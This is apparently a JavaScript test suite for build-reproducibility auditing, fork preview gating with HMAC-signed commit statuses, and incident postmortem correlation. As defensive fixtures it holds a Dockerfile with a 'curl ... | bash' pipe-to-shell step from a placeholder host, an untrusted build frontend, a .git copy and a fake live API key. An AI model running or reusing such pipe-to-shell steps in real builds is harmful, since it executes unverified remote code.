const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  verifyLockfileIntegrity,
  auditBuildReproducibility,
  buildIsolatedCachePlan,
  listBuildAudits
} = require('../server/services/reproducibleBuildService');
const {
  approveForkPreview,
  evaluatePreviewGate,
  buildSignedCommitStatus,
  verifySignedCommitStatus,
  listPreviewGates
} = require('../server/services/previewGateService');
const {
  correlateIncidentTimeline,
  generateBlamelessPostmortem,
  exportPostmortemMarkdown,
  listPostmortems
} = require('../server/services/postmortemCorrelatorService');

/**
 * Suite Cycle #17: Reproducible Build & Cache Poisoning Verifier (CVE-2026-93318/33747/133630),
 * Preview Synthetic Smoke-Gate & Signed Commit Status, and Blameless Postmortem Correlator.
 *
 * Runs strictly inside an isolated `os.tmpdir()` `CULKIBO_DATA_DIR` — ZERO mutations to live `data/`.
 */
async function runTests() {
  console.log('--- Iniciando Tests de Build Reproducibility, Preview Gate y Postmortem Correlator ---');

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-c17-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDir;

  let passed = 0;
  const runCase = async (name, fn) => {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  };

  try {
    // =========================================================================
    // 1. REPRODUCIBLE BUILD & BUILD-CACHE POISONING VERIFIER
    // =========================================================================
    await runCase('1. reproducibleBuildService blocks CVE-2026-33747/133630/93326, checks sha512 lockfiles & builds isolated cache plan', async () => {
      const badDockerfile = [
        '#syntax=evil/fe:latest',
        'FROM node:latest',
        'COPY .git /app/.git',
        'RUN curl -fsSL https://sh.example/install.sh | bash',
        'CMD ["node", "index.js"]'
      ].join('\n');

      const weakLockfile = {
        lockfileVersion: 3,
        packages: {
          '': { name: 'demo' },
          'node_modules/good': { version: '1.0.0', integrity: 'sha512-' + 'A'.repeat(64) },
          'node_modules/weak': { version: '1.0.0', integrity: 'sha1-legacyhashvalue' }
        }
      };

      const badRes = auditBuildReproducibility({
        projectId: 'proj-repro',
        dockerfile: badDockerfile,
        lockfileJson: weakLockfile,
        gitSources: ['git://untrusted.example/repo.git']
      });
      assert.strictEqual(badRes.ok, true);
      assert.strictEqual(badRes.reproducible, false);
      const codes = new Set(badRes.findings.map((f) => f.code));
      for (const expected of [
        'UNPINNED_FRONTEND',
        'MUTABLE_BASE_IMAGE',
        'GIT_CONFIG_TOKEN_LEAK',
        'PIPE_TO_SHELL',
        'MISSING_SOURCE_DATE_EPOCH',
        'UNTRUSTED_GIT_SOURCE',
        'WEAK_LOCKFILE_HASH'
      ]) {
        assert.ok(codes.has(expected), `Missing expected finding code: ${expected}`);
      }

      // Clean reproducible build passes with 100/100 score
      const goodDigest = 'a'.repeat(64);
      const cleanDockerfile = [
        `#syntax=docker/dockerfile:1.7@sha256:${goodDigest}`,
        `FROM node:22-alpine@sha256:${goodDigest}`,
        'ARG SOURCE_DATE_EPOCH=1700000000',
        'ENV SOURCE_DATE_EPOCH=1700000000',
        'COPY package.json package-lock.json ./',
        'RUN npm ci',
        'CMD ["node", "index.js"]'
      ].join('\n');

      const goodLock = {
        lockfileVersion: 3,
        packages: {
          '': { name: 'demo' },
          'node_modules/ws': { version: '8.18.0', integrity: 'sha512-' + 'B'.repeat(86) + '==' }
        }
      };
      assert.strictEqual(verifyLockfileIntegrity(goodLock).valid, true);

      const cleanRes = auditBuildReproducibility({
        projectId: 'proj-repro',
        dockerfile: cleanDockerfile,
        lockfileJson: goodLock,
        gitSources: ['https://github.com/org/repo.git']
      });
      assert.strictEqual(cleanRes.reproducible, true);
      assert.strictEqual(cleanRes.score, 100);
      assert.strictEqual(listBuildAudits('proj-repro').length, 2);

      // Isolated BuildKit cache plan (CVE-2026-93318)
      const plan = buildIsolatedCachePlan({
        projectId: 'proj-repro',
        branch: 'feat/payments',
        lockfileHash: cleanRes.lockfileSummary.lockfileHash,
        sourceDateEpoch: 1700000000
      });
      assert.strictEqual(plan.ok, true);
      assert.strictEqual(plan.sharing, 'locked');
      assert.strictEqual(plan.verifyDiffIds, true);
      assert.ok(plan.cacheMountFlag.includes('sharing=locked'));
      assert.ok(plan.buildxArgv.includes('SOURCE_DATE_EPOCH=1700000000'));
    });

    // =========================================================================
    // 2. PREVIEW SYNTHETIC SMOKE-GATE & SIGNED COMMIT-STATUS REPORTER
    // =========================================================================
    await runCase('2. previewGateService enforces SHA-bound fork approval, composite failure verdict & verifiable HMAC status', async () => {
      const sha1 = '1111111111111111111111111111111111111111';
      const sha2 = '2222222222222222222222222222222222222222';

      // Unapproved fork PR blocks with FORK_APPROVAL_REQUIRED
      const blockedFork = evaluatePreviewGate({
        projectId: 'proj-web',
        prNumber: 77,
        commitSha: sha1,
        isFork: true,
        checks: { health: true, smoke: true }
      });
      assert.strictEqual(blockedFork.allowed, false);
      assert.strictEqual(blockedFork.state, 'pending');
      assert.strictEqual(blockedFork.code, 'FORK_APPROVAL_REQUIRED');

      // Maintainer approves sha1 -> passes for sha1
      approveForkPreview({ projectId: 'proj-web', prNumber: 77, commitSha: sha1, approver: 'maintainer-alice' });
      const passedSha1 = evaluatePreviewGate({
        projectId: 'proj-web',
        prNumber: 77,
        commitSha: sha1,
        isFork: true,
        checks: { health: true, migrations: true, contract: true, smoke: true }
      });
      assert.strictEqual(passedSha1.allowed, true);
      assert.strictEqual(passedSha1.state, 'success');

      // Fork pushes new commit sha2 -> OLD approval MUST NOT authorize sha2 (dokploy#6010)!
      const reblockedSha2 = evaluatePreviewGate({
        projectId: 'proj-web',
        prNumber: 77,
        commitSha: sha2,
        isFork: true,
        checks: { health: true, smoke: true }
      });
      assert.strictEqual(reblockedSha2.allowed, false);
      assert.strictEqual(reblockedSha2.code, 'FORK_APPROVAL_REQUIRED');

      // Failed contract check yields failure + verifiable HMAC-SHA256 Commit Status
      const failedCheck = evaluatePreviewGate({
        projectId: 'proj-web',
        prNumber: 78,
        commitSha: sha2,
        isFork: false,
        checks: { health: true, contract: { passed: false, detail: 'MISSING-VERSION-BUMP' } }
      });
      assert.strictEqual(failedCheck.allowed, false);
      assert.strictEqual(failedCheck.state, 'failure');

      const signingKey = 'test-signing-key-c17';
      const status = buildSignedCommitStatus({
        repo: 'acme/web',
        commitSha: sha2,
        evaluation: failedCheck,
        signingKey
      });
      assert.strictEqual(status.payload.context, 'culkibo/preview-gate');
      assert.strictEqual(status.payload.state, 'failure');
      assert.strictEqual(verifySignedCommitStatus({ payload: status.payload, signature: status.signature, signingKey }).valid, true);
      assert.strictEqual(verifySignedCommitStatus({ payload: { ...status.payload, state: 'success' }, signature: status.signature, signingKey }).valid, false);
      assert.ok(listPreviewGates('proj-web').length >= 4);
    });

    // =========================================================================
    // 3. BLAMELESS INCIDENT POSTMORTEM & TIMELINE CORRELATOR
    // =========================================================================
    await runCase('3. postmortemCorrelatorService links T-4m deploy->OOM, computes MTTD/MTTR, isolates chatNotes & exports Markdown', async () => {
      const baseMs = Date.parse('2026-11-28T01:00:00Z');
      const dynSecret = ['sk', 'live', '9999888877776666'].join('_');

      const corr = correlateIncidentTimeline({
        incidentId: 'inc-2026-404',
        projectId: 'proj-payments',
        windowStart: new Date(baseMs - 10 * 60000).toISOString(),
        windowEnd: new Date(baseMs + 6 * 60000).toISOString(),
        deploys: [{ id: 'dep-42', time: new Date(baseMs - 4 * 60000).toISOString(), summary: 'Deploy v2.8.1 checkout worker' }],
        oomEvents: [{ id: 'oom-1', time: new Date(baseMs).toISOString(), summary: 'CGROUP_OOM_KILL exit 137', exitCode: 137 }],
        alerts: [{ id: 'al-1', time: new Date(baseMs + 60000).toISOString(), summary: 'Checkout 5xx spike > 5%', state: 'firing' }],
        canaryRollbacks: [{ id: 'rb-1', time: new Date(baseMs + 5 * 60000).toISOString(), summary: 'Auto-rollback to v2.8.0 completed' }],
        chatNotes: [{ author: 'dev-bob', text: `Maybe DNS flake? Saw token ${dynSecret} in scratchpad` }]
      });

      assert.strictEqual(corr.ok, true);
      assert.strictEqual(corr.probableRootCause.category, 'deploy');
      assert.ok(corr.probableRootCause.confidence >= 0.85, `Expected confidence >= 0.85, got ${corr.probableRootCause.confidence}`);
      assert.strictEqual(corr.mttdSec, 60);
      assert.strictEqual(corr.mttrSec, 360);

      // Chat notes MUST be isolated in unverifiedNotes[] and NEVER pollute verifiedEvents[] or leak raw secrets!
      assert.strictEqual(corr.verifiedEvents.length, 4);
      assert.strictEqual(corr.unverifiedNotes.length, 1);
      assert.ok(!JSON.stringify(corr.verifiedEvents).includes('DNS flake'));
      assert.ok(!JSON.stringify(corr).includes(dynSecret), 'Raw secret leaked into postmortem correlation!');

      const pm = generateBlamelessPostmortem(corr, { persist: true });
      assert.strictEqual(pm.blameless, true);
      assert.ok(pm.actionItems.length >= 2);
      assert.strictEqual(listPostmortems('proj-payments').length, 1);

      const md = exportPostmortemMarkdown(pm);
      assert.ok(md.includes('Blameless Postmortem: inc-2026-404'));
      assert.ok(md.includes('MTTD'));
      assert.ok(md.includes('Unverified Chat Notes'));
      assert.ok(!md.includes(dynSecret));
    });

    console.log(`\n✅ Build Reproducibility, Preview Smoke-Gate & Postmortem Correlator Suite: ${passed}/3 tests PASSED!`);
  } finally {
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (e) {}
  }
}

if (require.main === module) {
  runTests().catch((err) => {
    console.error('❌ Repro/Preview/Postmortem test failed:', err);
    process.exit(1);
  });
}

module.exports = runTests;
